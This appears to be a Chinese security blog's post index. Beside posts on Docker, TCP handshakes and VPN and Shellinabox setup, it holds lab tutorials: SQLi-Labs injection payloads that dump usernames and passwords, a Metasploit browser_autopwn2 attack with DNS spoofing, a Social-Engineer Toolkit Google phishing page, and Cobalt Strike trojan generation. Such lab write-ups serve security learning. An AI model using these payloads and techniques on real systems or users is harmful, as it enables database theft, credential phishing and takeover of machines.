//开启容器docker stop 容器ID或容器名 //停止运行中的容器docker ps -a //查看停止的容器docker rm 容器ID或容器名 //删除容器docker exec -it 容器ID或容器名 /bin/bash //进入容器内部docker save 容器名/容器ID &gt; test.tar //导出容器docker load &lt; test.tar //导入容器]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>ubuntu</tag>
        <tag>python3.7</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP协议三次握手和四次挥手]]></title>
    <url>%2Fthree-way-handshake%2F</url>
    <content type="text"><![CDATA[三次握手 四次挥手 TCP状态转换 一. 三次挥手 SYN是标志位，SYN=1表示请求连接 第一次第一次握手：建立连接时，客户端发送SYN包（syn=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。 第二次第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态； 第三次第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。 二. 四次挥手 由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。这原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。 第一次挥手 主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可以接受数据。 第二次挥手 被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号， SYN 和 FIN 都有seq序号）。 第三次挥手 被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。 第四次挥手 主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。 三. TCP状态转换 状态说明： CLOSED: 这个表示初始状态。 LISTEN（服务器）: 这个也是非常容易理解的一个状态，表示服务器端的某个SOCKET处于监听状态，可以接受连接了。 SYN_RCVD（服务器）: 这个状态表示接受到了SYN报文，在正常情况下，这个状态是服务器端的SOCKET在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上用netstat你是很难看到这种状态的，除非你特意写了一个客户端测试程序，故意将三次TCP握手过程中最后一个ACK报文不予发送。因此这种状态时，当收到客户端的ACK报文后，它会进入到ESTABLISHED状态。 SYN_SENT: 这个状态与SYN_RCVD呼应，当客户端SOCKET执行CONNECT连接时，它首先发送SYN报文，因此也随即它会进入到了SYN_SENT状态，并等待服务端的发送三次握手中的第2个报文。SYN_SENT状态表示客户端已发送SYN报文。 ESTABLISHED：这个容易理解了，表示连接已经建立了。 FIN_WAIT_1: 这个状态要好好解释一下，其实FIN_WAIT_1和FIN_WAIT_2状态的真正含义都是表示等待对方的FIN报文。而这两种状态的区别是：FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET即进入到FIN_WAIT_1状态。而当对方回应ACK报文后，则进入到FIN_WAIT_2状态，当然在实际的正常情况下，无论对方何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1状态一般是比较难见到的，而FIN_WAIT_2状态还有时常常可以用netstat看到。 FIN_WAIT_2：上面已经详细解释了这种状态，实际上FIN_WAIT_2状态下的SOCKET，表示半连接，也即有一方要求close连接，但另外还告诉对方，我暂时还有点数据需要传送给你，稍后再关闭连接。 TIME_WAIT: 表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文时，可以直接进入到TIME_WAIT状态，而无须经过FIN_WAIT_2状态。 注:MSL(最大分段生存期)指明TCP报文在Internet上最长生存时间,每个具体的TCP实现都必须选择一个确定的MSL值.RFC 1122建议是2分钟,但BSD传统实现采用了30秒.TIME_WAIT 状态最大保持时间是2 * MSL,也就是1-4分钟 结论：在TIME_WAIT下等待2MSL，只是为了尽最大努力保证四次握手正常关闭。确保老的报文段在网络中消失，不会影响新建立的连接. CLOSING: 这种状态比较特殊，实际情况中应该是很少见，属于一种比较罕见的例外状态。正常情况下，当你发送FIN报文后，按理来说是应该先收到（或同时收到）对方的ACK报文，再收到对方的FIN报文。但是CLOSING状态表示你发送FIN报文后，并没有收到对方的ACK报文，反而却也收到了对方的FIN报文。什么情况下会出现此种情况呢？其实细想一下，也不难得出结论：那就是如果双方几乎在同时close一个SOCKET的话，那么就出现了双方同时发送FIN报文的情况，也即会出现CLOSING状态，表示双方都正在关闭SOCKET连接。 CLOSE_WAIT: 这种状态的含义其实是表示在等待关闭。怎么理解呢？当对方close一个SOCKET后发送FIN报文给自己，你系统毫无疑问地会回应一个ACK报文给对方，此时则进入到CLOSE_WAIT状态。接下来呢，实际上你真正需要考虑的事情是察看你是否还有数据发送给对方，如果没有的话，那么你也就可以close这个SOCKET，发送FIN报文给对方，也即关闭连接。所以你在CLOSE_WAIT状态下，需要完成的事情是等待你去关闭连接。 LAST_ACK: 这个状态还是比较容易好理解的，它是被动关闭一方在发送FIN报文后，最后等待对方的ACK报文。当收到ACK报文后，也即可以进入到CLOSED可用状态了。]]></content>
      <categories>
        <category>理论基础</category>
      </categories>
      <tags>
        <tag>TCP协议</tag>
        <tag>三次握手</tag>
        <tag>四次挥手</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用MSF和Ettercap进行自动化浏览器攻击]]></title>
    <url>%2Fmsf-browser-autopwn2%2F</url>
    <content type="text"><![CDATA[前言 攻击过程 一. 前言1. MSF模块：browser_autopwn2browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。 二. 攻击过程1. 攻击环境 攻击机：kali linux 2019.1 靶机：Windows xp Professional sp3 2. 攻击步骤2.1 使用Ettercap进行DNS欺骗该过程参考使用Ettercap实现DNS欺骗的简单测试一文 2.2 使用browser_autopwn2模块生成恶意URL123456/etc/init.d/postgresql startmsfdb initmsfconsolesearch browser_autopwn2use auxiliary/server/browser_autopwn2run 2.3 添加跳转脚本进入网站目录下，修改index.html文件，设置如下内容 1234&lt;script language="javascript" type="text/javascript"&gt; // 以下方式定时跳转setTimeout("javascript:location.href='Hello！'", 1000); &lt;/script&gt; 注意将Hello!修改为MSF生成的恶意url 2.4 靶机访问靶机访问百度网站，可以看到页面跳转，此时MSF已经开始进行攻击 2.5 启动会话MSF创建会话之后，我们需要手动启用会话 1sessions -l 1sessions -i 1 #1为目标机器id 在攻击过程中可能会出现浏览器崩溃等情况，可以多尝试几次 123getuidgetsystemgetuid 关于命令行乱码问题可以调整Linux终端的编码类型为GBK2312]]></content>
      <categories>
        <category>攻击测试</category>
      </categories>
      <tags>
        <tag>kali Linux</tag>
        <tag>攻击测试</tag>
        <tag>Ettercap</tag>
        <tag>Metasploit</tag>
        <tag>browser_autopwn2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLi-Labs第一章（Less-1 - Less-6）]]></title>
    <url>%2Fsqli-libs-first%2F</url>
    <content type="text"><![CDATA[前言 注入过程 一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 二. 注入过程 测试环境 MySQL 5.5.53 PHP 5.6.27-nts Apache 2.4 1. Less-11）首先进入SQLi-Labs，选择第一题 2）在地址后输入?id=1，发现可以显示用户信息，说明不是数值查询 3）接下来尝试修改修改id值，发现一直到12都可以显示信息 4）在地址后输入?id=1&#39;，发现返回错误信息，表示存在SQL字符注入 5）将参数改为?id=1&#39; --+，发现返回信息正常，则说明是单引号字符型注入 6）使用order by判断行数，当行数增加到4时返回错误信息，说明共有3列数据 7）将id=1改为一个数据库不存在的id值，使用union select 1,2,3联合查询语句查看页面是否有显示位 可以看到，返回了2和3两个值，说明有两个显示位 8）利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息 1?id=15&apos; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 9）查询security内的所有表名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3 --+ 10）爆破user表的列名 1?id=15&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;) --+ 可以看到列表名为id、username和password 11）最后查询所有的用户名和密码 1?id=15&apos; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+ 2. Less-2同样的我们先输入参数?id=1 将参数改为?id=1&#39;后报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 意思是单引号破坏了查询导致了错误，所以说，查询代码使用了整数。可以使用?id=1--+来注释掉剩余查询 查看代码可以看到具体的查询语句如下 1$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 使用以下payload均显示正常 12?id=1--+ or 1=1?id=1 or 1=1 --+ 可以使用如下payload获得显示位 其余步骤与Less-1相同 3. Less-3使用参数?id=1&#39; 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 猜测使用的是如下SQL语句 1Select login_name, select password from table where id= ('our input here') 使用参数?id=1)--+ 可以看到显示正常，说明猜测是正确的，查看源代码发现语句如下 1$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; 使用如下payload同样可以 1?id=&apos;) or &apos;1&apos;=(&apos;1 获得显示位 4. Less-4使用参数?id=1&quot;时报错 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 猜测id被括号_()_和_””_所包装 使用参数?id=1&quot;) --+，可以看到显示正常 查看源代码，可以看到语句如下 12$id = '"' . $id . '"';$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1"; 使用如下payload 12?id=&quot;) or &quot;1&quot;=(&quot;1?id=&quot;) or 1=1--+ 获得显示位 5. Less-5第五关使用的是盲注，通过源代码可以看到，如果输入正确，返回的是You are in........... 部分源代码如下 12345678910111213141516171819202122$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size="5" color="#FFFF00"&gt;'; echo 'You are in...........'; echo "&lt;br&gt;"; echo "&lt;/font&gt;"; &#125; else &#123; echo '&lt;font size="3" color="#FFFF00"&gt;'; print_r(mysql_error()); echo "&lt;/br&gt;&lt;/font&gt;"; echo '&lt;font color= "#0000ff" font size= 3&gt;'; &#125;&#125; else &#123; echo "Please input the ID as parameter with numeric value";&#125; 5.1 基于布尔的盲注5.1.1 获取数据库长度首先尝试查看数据库长度 1234?id=1%27and%20length(database())=8%23%27= &apos;(单引号)%20= space(空格) 可以看到，数据库长度等于8时返回正常 当数据库长度不对时，不会有信息返回 5.1.2 获取数据库名5.1.2.1 使用left()函数获取数据库名接下来，尝试拿到数据库名的第一位 12?id=1&apos; and left(database(),1)&gt;&apos;a&apos;--+?id=1%27and%20left(database(),1)%3e%27a%27--+ 该语句的意思是数据库名的第一位是否大于a，如果大于a则返回真，否则返回否。 可以看到返回正常，说明数据库名第一位大于a，这里可以通过二分法猜出数据库名，测试得第一位是s。 尝试拿到数据库名的第二位 1?id=1&apos; and left(database(),2)&gt;&apos;sf&apos;--+ 可以看到返回值为假，说明第二位比f小。以此可以拿到数据库名为security 5.1.2.2 使用substr()、ascii()函数获取数据名因为具体的原理是差不多的，这里就只展示以下 1?id=1&apos; and ascii(substr(database(),1))=115--+ s的ASCII值为115，换成116试一试 可以看到，返回的是错误的 5.1.3 获取数据库下的表名5.1.3.1 获取第一个表的表名首先尝试拿到第一个表的表名的第一位，因为已经知道表名了，就只是验证一下 1?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+ 可以看到表名的第一位是e(ascii=101) 接下来获取第二位，这里需要将substr()函数的第二个参数改成2 1?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+ 第二位是m(ascii=109) 5.1.3.2 获取第二个表的表名那么关键问题来了，如何获取第二个表 这里需要将limit 0,1改为limit 1,1，因为第一个参数是表示从哪里开始。 1?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+ 可以看到，第二个表的第一位是r(ascii=114) 5.1.4 获取users表中的列使用regexp获取users表中的列 1234查看*users*表中是否含有名字以*us*开头的列?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1)--+?id=1%27%20and%201=(select%201%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20table_name%20regexp%20%27%5eus%5ba-z%5d%27%20limit%200,1)--+ 1234查看*users*表中是否含有名字是*username*的列?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^username&apos; limit 0,1)--+?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^username&apos; limit 0,1)--+ 5.1.5 使用ord()和mid()函数获取users表的内容首先获取username列中第一行第一个字符 12?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=68--+ 上面参数的意思是获取username列中第一行第一个字符的ASCII值，可以看到第一个字符是D 用同样的方法获得第二个字符 12?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),2,1))=117--+将MID()的第二个参数改为2 同样的，获取第二行第一个字符 12?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 1,1),1,1))=65--+将LIMIT的第一个参数改为1 5.2 基于报错的盲注5.2.1 普通的报错注入1?id=1&apos; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+ 5.2.2 利用double数值类型超出范围进行报错注入1?id=1&apos; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+ 5.2.3 利用bigint溢出进行报错注入1?id=1&apos; union select (!(select * from (select user())x) - ~0),2,3--+ 5.2.4 xpath函数报错注入1?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+ 1?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+ 5.2.5 利用数据的重复性1?id=1&apos;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+ 6. Less-65和6的区别是在id传入时经过了处理 1?id=1&quot; 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot; LIMIT 0,1&apos; at line 1 可以看到报错信息，传入参数的左右两边引号不匹配。通过代码可以看到是在参数两边加上了&quot;作为包装 12$id = '"'.$id.'"';$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 除此之外，与Less-5的方式是一样的，只用一个作为演示 1?id=1&quot; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+ 篇幅太长了，这一篇就先写到这里，剩下的会慢慢写]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>SQLi-Labs</tag>
        <tag>报错注入</tag>
        <tag>联合查询</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入测试平台SQLi-Labs搭建]]></title>
    <url>%2Fsqli-libs-install%2F</url>
    <content type="text"><![CDATA[前言 环境搭建 一. 前言SQLi-Labs是一个专业的SQL注入练习平台，该平台包含了以下在测试场景中常见的注入类型： 1.报错注入（联合查询） ​ &nbsp;&nbsp;&nbsp;&nbsp;1）字符型 ​ &nbsp;&nbsp;&nbsp;&nbsp;2）数字型 2.报错注入（基于二次注入） 3.盲注 ​ &nbsp;&nbsp;&nbsp;&nbsp;1）基于布尔值 ​ &nbsp;&nbsp;&nbsp;&nbsp;2）基于时间 4.UPDATE型注入练习 5.INSERT型注入练习 6.HTTP头部注入 ​ &nbsp;&nbsp;&nbsp;&nbsp;1）基于Referer ​ &nbsp;&nbsp;&nbsp;&nbsp;2）基于UserAgent ​ &nbsp;&nbsp;&nbsp;&nbsp;3）基于Cookie 7.二次排序注入练习 对于学习SQL注入来说是一个优秀的平台。 二. 环境搭建1. 准备工作SQLi-Labs测试平台需要以下环境 Apache Tomcat MySQL PHP Java 本文使用的是phpstudy集成环境进行安装，Java的安装和配置本文就不再赘述 2. 安装过程2.1 下载并解压从GitHub上下载SQLi-Labs，解压到phpstudy的网站目录下 2.2 修改配置文件进入网站目录，在sql-connections文件夹下找到db-creds.inc文件，修改文件内容，将用户名和密码改成本地MySQL数据库的用户名和密码 2.3 安装打开浏览器，输入http://127.0.0.1/sqli-labs-master进入SQLi-Labs测试平台 点击Setup/reset Database for labs进行安装，出现以下界面则表示安装成功]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>环境搭建</tag>
        <tag>SQLi-Labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在Windows server 2008 R2 上搭建VPN服务器]]></title>
    <url>%2FwinServer08R2-vpn%2F</url>
    <content type="text"><![CDATA[前言 搭建过程 一. 前言1. 什么是VPN虚拟专用网络(VPN)的功能是：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。VPN有多种分类方式，主要是按协议进行分类。VPN可通过服务器、硬件、软件等多种方式实现。 二. 搭建过程1. Windows Server 搭建VPN服务器winserver- 打开服务器管理器，右击角色-添加角色 点击下一步，选择网络策略和访问服务 下一步，选择网络策略服务器和路由和远程访问服务 一路下一步完成安装 右击路由和远程访问，选择配置并启用路由和远程访问 下一步，选择自定义配置 下一步，选择VPN访问、NAT、LAN路由 下一步到最后，启动服务 进入路由和远程访问-IPv4，右击NAT，选择新增接口 选择本地连接 设置属性，勾选公用接口连接到Internet，并选择在此接口上启用NAT 接下来建立VPN访问用户，由于本机使用的是域环境，所以在Active Directory 域服务-Active Directory 用户和计算机-域名-User中创建用户，如果没有域环境在本机用户中创建即可 在中间空白处右击创建用户 创建完用户后记得更改用户属性 在属性中找到拨入选项卡，将网络访问权限改为允许访问 至此，Windows Server上的VPN服务器已经搭建完成，接下来去测试服务器是否能够正常连接 2. 使用Windows7连接测试在网络和共享中心里选择设置新的连接或网络 选择连接到工作区 选择使用我的Internet连接(VPN) 在Internet地址中输入VPN服务器的IP地址 输入刚才新建的用户 完成连接 从网络设置中可以看到，DNS服务器的地址是VPN服务器地址]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Windows server</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Social-Engineer-Toolkit生成钓鱼网站]]></title>
    <url>%2FSocial-engineer-toolkit%2F</url>
    <content type="text"><![CDATA[前言 工具使用 其他 一. 前言1. 钓鱼网站钓鱼网站通常指伪装成目标网站，窃取用户提交的帐号、密码等私密信息的网站。“钓鱼”是一种网络欺诈行为，指不法分子利用各种手段，仿冒真实网站的URL地址以及页面内容，或利用真实网站服务器程序上的漏洞在站点的某些网页中插入危险的HTML代码，以此来骗取用户银行或信用卡账号、密码等私人资料。 2. 社会工程学社会工程学（Social Engineering）在上世纪60年代左右作为正式的学科出现，广义社会工程学的定义是：建立理论并通过利用自然的、社会的和制度上的途径来逐步地解决各种复杂的社会问题。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。你们可能永远都想象不到，对于黑客们来说，通过一个用户名、一串数字、一串英文代码，社会工程师就可以通过这么几条的线索，通过社工攻击手段，加以筛选、整理，就能把你的所有个人情况信息、家庭状况、兴趣爱好、婚姻状况、你在网上留下的一切痕迹等个人信息全部掌握得一清二楚。虽然这个可能是最不起眼，而且还是最麻烦的方法。一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。 3. Social-Engineering-ToolkitSocial Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。 二. 工具使用1. 生成钓鱼页面在kali Linux中，选择应用程序-Social Engineering Tools-Social-Engineering-Toolkit，打开程序 1) Social-Engineering Attacks(社工工程学攻击) 2) Penetration Testing (Fast-Track)（快速追踪测试） 3) Third Party Modules（第三模块） 4) Update the Social-Engineer Toolkit（升级） 5) Update SET configuration（升级配置） 6) Help, Credits, and About（帮助） 选择1)Social-Engineering Attacks，进入下一级菜单 1) Spear-Phishing Attack Vectors(鱼叉式网络钓鱼攻击) 2) Website Attack Vectors（网页攻击） 3) Infectious Media Generator（传染媒介产生器—木马） 4) Create a Payload and Listener（建立pay和监听器） 5) Mass Mailer Attack（邮件群发攻击） 6) Arduino-Based Attack Vector（基于Arduino攻击方式） 7) Wireless Access Point Attack Vector（无线接入攻击） 8) QRCode Generator Attack Vector（二维码攻击） 9) Powershell Attack Vectors（powershell攻击） 10) SMS Spoofing Attack Vector（SMS欺骗攻击） 11) Third Party Modules（第三模块） 选择2)Website Attack Vectors，进入下一级菜单 1) Java Applet Attack Method （java applet小程序攻击） 2) Metasploit Browser Exploit Method（MSF 浏览器攻击） 3) Credential Harvester Attack Method（钓鱼网站攻击） 4) Tabnabbing Attack Method（标签钓鱼攻击） 5) Web Jacking Attack Method（网站Jacking 攻击） 6) Multi-Attack Web Method（多站点攻击） 7) Full Screen Attack Method（全屏幕攻击） 8) HTA Attack Method（HTA攻击） 选择3) Credential Harvester Attack Method，进入下一级菜单 1) Web Templates (网站模板) 2) Site Cloner （网站克隆） 3) Custom Import （自定义） 选择1) Web Templates，进入下一级菜单 输入本机IP，进入下一级 选择2) Google，生成谷歌登录页面 按下回车，便开始监听 2. 测试钓鱼页面Social-Engineering-Toolkit生成完成钓鱼页面并开始监听后，我们从靶机访问钓鱼页面。 在输入完用户名密码后登录，Social-Engineering-Toolkit会显示收到的用户名和密码 三. 其他以上便是使用Social-Engineering-Toolkit生成钓鱼页面并获取用户信息的全过程。除了使用内置的网站模板外，还可以复制其他网站进行钓鱼。除此之外，我们可以配合Ettercap进行DNS欺骗，增加钓鱼网站的真实性。 本次实验为简单的测试，在实际使用中还需要考虑使用HTTPS协议、跨域访问等种种问题。 Social-Engineering-Toolkit还有许多更为强大的功能，需要慢慢学习。]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Social-Engineer-Toolkit</tag>
        <tag>钓鱼网站</tag>
        <tag>社工</tag>
        <tag>kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Cobalt Strike生成Windows木马并攻击靶机的简单测试]]></title>
    <url>%2Fcobalt-strike%2F</url>
    <content type="text"><![CDATA[前言 攻击过程 后记 一. 前言1. 关于Cobalt StrikeCobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。而Cobalt Strike 3.0已经不再使用Metasploit框架而作为一个独立的平台使用，当然可以结合Armitage进行使用。 二. 攻击过程1. 攻击环境 攻击机：Windows7 ultimate sp1 IP：192.168.28.128 靶机：Windows7 ultimate sp1 IP：192.168.28.138 2. 攻击步骤2.1 开启TeamServer服务使用cmd命令行进入Cobalt Strike所在文件夹，使用如下命令开启TeamServer 1teamserver 本机IP 连接密码 #密码可以随意设置 接下来会提示服务已经建立服务，同时还会显示所使用的端口 2.2 使用客户端连接启动Cobalt Strike，填写相关信息，点击connect连接，进入主界面 2.3 生成病毒文件选择Attacks-&gt;Packages-&gt;Windows Executable 设置listener和输出的病毒文件格式 点击Generate生成，选择保存的位置 2.4 投放病毒把病毒放入靶机，并运行。我们可以通过Cobalt Strike发现靶机已经上线，同时可以进行多种操作 三. 后记以上就是使用Cobalt Strike进行简单攻击模拟的全过程。可以看到，关于工具本身使用非常简单,纯图形化操作,稍微有点儿基础,很快就能上手,而且它直接支持图标灵活拖拽很方便对指定肉鸡进行集中批量操作,非常友好。当然，在实际运用过程肯定在测试环境中要复杂的多，但毫无疑问作为一款工具，Cobalt Strike足够优秀。]]></content>
      <categories>
        <category>攻击测试</category>
      </categories>
      <tags>
        <tag>攻击测试</tag>
        <tag>Cobalt Strike</tag>
        <tag>木马攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Shellinabox在浏览器进行ssh登录]]></title>
    <url>%2FShellinabox%2F</url>
    <content type="text"><![CDATA[Shellinabox介绍 Shellinabox安装 使用Ngrok将服务映射到外网 一. Shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用http://IP:4200来登录到系统，在启用了SSL/TLS证书，需要用https://IP:4200来登录。默认情况下Shellinabox使用的是4200端口。 二. Shellinabox安装1. 更新软件源使用的是系统是Kali Linux 2019，在终端输入 1root@kali:~# install shellinabox 如果提示无法找到包，请添加国内更新源 12345678910root@kali:~# vi /etc/apt/sources.list//添加下列更新源#国科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 2. Shellinabox参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859List of command line options: -b, --background[=PIDFILE] run in background -c, --cert=CERTDIR set certificate dir (default: $PWD) --cert-fd=FD set certificate file from fd --css=FILE attach contents to CSS style sheet --cgi[=PORTMIN-PORTMAX] run as CGI -d, --debug enable debug mode -f, --static-file=URL:FILE serve static file from URL path -g, --group=GID switch to this group (default: nogroup) -h, --help print this message --linkify=[none|normal|aggressive] default is &quot;normal&quot; --localhost-only only listen on 127.0.0.1 --no-beep suppress all audio output -n, --numeric do not resolve hostnames -m, --messages-origin=ORIGIN allow iframe message passing from origin --pidfile=PIDFILE publish pid of daemon process -p, --port=PORT select a port (default: 4200) -s, --service=SERVICE define one or more services -t, --disable-ssl disable transparent SSL support --disable-ssl-menu disallow changing transport mode --disable-utmp-logging disable logging to utmp and wtmp -q, --quiet turn off all messages --unixdomain-only=PATH:USER:GROUP:CHMOD listen on unix socket -u, --user=UID switch to this user (default: nobody) --user-css=STYLES defines user-selectable CSS options -v, --verbose enable logging messages --version prints version information --disable-peer-check disable peer check on a sessionDebug, quiet, and verbose are mutually exclusive.One or more --service arguments define services that should be made availablethrough the web interface: SERVICE := &lt;url-path&gt; &apos;:&apos; APP APP := &apos;LOGIN&apos; | &apos;SSH&apos; [ : &lt;host&gt; ] | USER &apos;:&apos; CWD &apos;:&apos; CMD USER := &apos;AUTH&apos; | &lt;username&gt; &apos;:&apos; &lt;groupname&gt; CWD := &apos;HOME&apos; | &lt;dir&gt; CMD := &apos;SHELL&apos; | &lt;cmdline&gt;&lt;cmdline&gt; supports variable expansion: $&#123;columns&#125; - number of columns $&#123;gid&#125; - gid id $&#123;group&#125; - group name $&#123;home&#125; - home directory $&#123;lines&#125; - number of rows $&#123;peer&#125; - name of remote peer $&#123;realip&#125; - value of HTTP header field &apos;X-Real-IP&apos; $&#123;uid&#125; - user id $&#123;url&#125; - the URL that serves the terminal session $&#123;user&#125; - user nameOne or more --user-css arguments define optional user-selectable CSS options.These options show up in the right-click context menu: STYLES := GROUP &#123; &apos;;&apos; GROUP &#125;* GROUP := OPTION &#123; &apos;,&apos; OPTION &#125;* OPTION := &lt;label&gt; &apos;:&apos; [ &apos;-&apos; | &apos;+&apos; ] &lt;css-file&gt;OPTIONs that make up a GROUP are mutually exclusive. But individual GROUPs areindependent of each other. 12345678-b 后台运行-c, --cert=CERTDIR 指定证书目录（默认当前工作路径）-p, --port=PORT 更改端口 (默认: 4200)-t, --disable-ssl 关闭SSL传输-q, --quiet 安静模式，禁用所有信息-u, --user=UID 设置登录用户 (默认: nobody)-v, --verbose 开启登录信息提示--version 显示版本信息 3. Shellinabox启动1root@kali:~# shellinaboxd -b -t 启动服务之后，在浏览器访问http://IP:4200，默认4200端口，可以自己修改 